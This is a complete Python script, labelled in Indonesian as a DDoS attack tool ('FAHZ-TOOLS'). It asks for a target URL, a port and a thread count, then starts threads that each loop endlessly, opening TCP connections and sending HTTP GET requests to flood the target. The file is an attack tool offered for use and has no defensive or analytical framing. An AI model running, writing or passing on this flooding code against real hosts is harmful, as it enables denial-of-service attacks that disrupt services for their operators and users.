#!/usr/bin/env python3
import socket
import threading
import sys
import time

def ddos_attack(target_url, port, threads):
    print(f"\n[!] TARGET: {target_url}:{port}")
    print(f"[!] THREADS: {threads}")
    print("[!] Memulai serangan DDoS... Tekan Ctrl+C untuk berhenti\n")
    
    target_ip = socket.gethostbyname(target_url)
    
    def attack():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, port))
                sock.sendto(("GET / HTTP/1.1\r\n").encode(), (target_ip, port))
                sock.sendto(("Host: " + target_url + "\r\n\r\n").encode(), (target_ip, port))
                sock.close()
            except:
                pass
    
    for _ in range(int(threads)):
        thread = threading.Thread(target=attack)
        thread.start()

if __name__ == "__main__":
    print("="*50)
    print("🔥 DDoS ATTACK TOOL - FAHZ-TOOLS 🔥")
    print("="*50)
    target = input("\nMasukkan target URL (contoh: example.com): ")
    port = int(input("Masukkan port (contoh: 80): "))
    threads = input("Jumlah threads (contoh: 500): ")
    
    try:
        ddos_attack(target, port, threads)
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan!")
        sys.exit()
